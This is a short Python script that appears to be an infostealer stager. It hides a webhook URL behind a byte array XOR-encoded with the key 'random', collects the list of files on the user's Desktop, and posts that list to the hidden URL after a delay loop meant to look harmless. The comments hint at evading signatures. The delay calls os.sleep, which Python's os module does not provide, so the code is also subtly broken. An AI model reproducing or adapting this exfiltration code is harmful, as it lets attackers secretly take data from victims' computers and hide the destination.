import os
import requests

### VARIABLES

PS1 = 1539495863945  #signatures alerting
PS2 = 5584359435856

key = "random"
encrypted_url = bytes([33, 25, 4, 31, 0, 73, 70, 77, 8, 12, 58, 14, 31, 29, 23, 93, 10, 13, 1, 74, 40, 83, 121, 93, 95, 25, 11, 3, 48, 42, 46, 10, 38, 61, 47, 34, 6, 6, 29, 81, 95, 33, 35, 16, 53, 90, 6, 54, 1, 57, 0, 5, 26, 33, 42, 63, 59, 36, 34, 17, 3, 71, 21, 53, 68, 54, 19, 7, 45, 49, 9, 62, 55, 23, 58, 25, 52, 22, 86, 120]) #This is the encrypted webhook URL dw aboout this
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
file_list = "\n".join(os.listdir(desktop_path))

data = {
    "content" : f"Boot up successful!\n Files: {file_list}"
}


def boot_up(paramchecker, paramidentifier):
    if paramchecker == paramidentifier:
        os.sleep(1000)
    else:
        os.sleep(1000)



def xor_decrypt(enc_bytes1, enc_key):
    temp = bytearray()
    key_byte = enc_key.encode()
    for i in range(len(enc_bytes1)):
        temp.append((enc_bytes1[i] ^ key_byte[i % len(key_byte)]))
    return temp.decode()
        

for i in range(0, 3):
    boot_up(1, 1)
requests.post(xor_decrypt(encrypted_url, key), json=data)
